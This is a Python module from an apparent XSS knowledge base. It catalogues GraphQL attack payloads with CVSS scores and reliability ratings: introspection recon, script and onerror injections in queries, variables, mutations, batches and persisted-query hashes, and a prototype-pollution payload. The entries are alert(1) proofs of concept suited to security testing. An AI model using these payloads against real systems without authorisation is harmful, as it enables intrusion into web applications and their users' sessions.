#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

GraphQL XSS Payloads
"""

from ..models import PayloadEntry


GRAPHQL_PAYLOADS = {
    # Query injection
    "gql_introspection": PayloadEntry(
        payload="{__schema{types{name,fields{name}}}}",
        contexts=["graphql_query"],
        severity="medium",
        cvss_score=5.3,
        description="GraphQL introspection query",
        tags=["graphql", "introspection", "recon"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "gql_query_xss": PayloadEntry(
        payload='"}}<script>alert(1)</script>',
        contexts=["graphql_query", "html_content"],
        severity="critical",
        cvss_score=8.8,
        description="GraphQL query XSS breakout",
        tags=["graphql", "query", "xss"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "gql_directive_xss": PayloadEntry(
        payload='@deprecated(reason:"<script>alert(1)</script>")',
        contexts=["graphql_query"],
        severity="high",
        cvss_score=7.5,
        description="GraphQL directive XSS",
        tags=["graphql", "directive", "xss"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # Variable injection
    "gql_var_script": PayloadEntry(
        payload="<script>alert(1)</script>",
        contexts=["graphql_variable", "html_content"],
        severity="critical",
        cvss_score=8.8,
        description="GraphQL variable script injection",
        tags=["graphql", "variable", "xss"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "gql_var_json": PayloadEntry(
        payload='{"name":"<script>alert(1)</script>"}',
        contexts=["graphql_variable", "json"],
        severity="critical",
        cvss_score=8.8,
        description="GraphQL JSON variable XSS",
        tags=["graphql", "variable", "json"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "gql_var_proto": PayloadEntry(
        payload='{"__proto__":{"innerHTML":"<script>alert(1)</script>"}}',
        contexts=["graphql_variable", "json"],
        severity="critical",
        cvss_score=9.0,
        description="GraphQL variable prototype pollution",
        tags=["graphql", "variable", "prototype-pollution"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "gql_var_nested": PayloadEntry(
        payload='{"user":{"profile":{"bio":"<script>alert(1)</script>"}}}',
        contexts=["graphql_variable", "json"],
        severity="critical",
        cvss_score=8.8,
        description="GraphQL nested variable XSS",
        tags=["graphql", "variable", "nested"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # Mutation injection
    "gql_mutation_xss": PayloadEntry(
        payload='mutation{createUser(input:{name:"<script>alert(1)</script>"}){id}}',
        contexts=["graphql_mutation"],
        severity="critical",
        cvss_score=8.8,
        description="GraphQL mutation XSS",
        tags=["graphql", "mutation", "xss"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "gql_mutation_img": PayloadEntry(
        payload='mutation{updateProfile(bio:"<img src=x onerror=alert(1)>"){id}}',
        contexts=["graphql_mutation"],
        severity="critical",
        cvss_score=8.8,
        description="GraphQL mutation image XSS",
        tags=["graphql", "mutation", "image"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # Batching attacks
    "gql_batch": PayloadEntry(
        payload='[{"query":"mutation{createUser(name:\\"<script>alert(1)</script>\\"){id}}"}]',
        contexts=["graphql_batch"],
        severity="critical",
        cvss_score=8.8,
        description="GraphQL batch query XSS",
        tags=["graphql", "batch", "xss"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # Persisted query
    "gql_persisted": PayloadEntry(
        payload='{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"<script>alert(1)</script>"}}}',
        contexts=["graphql_persisted"],
        severity="high",
        cvss_score=7.5,
        description="GraphQL persisted query hash injection",
        tags=["graphql", "persisted-query", "xss"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
}

GRAPHQL_PAYLOADS_TOTAL = len(GRAPHQL_PAYLOADS)
